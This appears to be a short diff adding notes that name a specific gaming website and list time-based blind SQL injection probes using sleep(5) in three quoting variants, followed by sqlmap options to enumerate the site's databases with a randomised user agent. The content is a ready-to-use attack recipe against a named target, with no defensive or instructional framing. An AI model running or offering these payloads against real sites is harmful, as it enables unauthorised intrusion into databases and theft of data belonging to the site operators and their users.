@@ -1,0 +1,10 @@
+https://haligame.com/
+
+判断注入
+15' and if(15,sleep(5),3)--+
+15" and if(15,sleep(5),3)--+
+15 and if(15,sleep(5),3)--+ 
+语句大家可自行结合
+
+sqlmap语句为:
+-p id --batch --random-agent --dbs
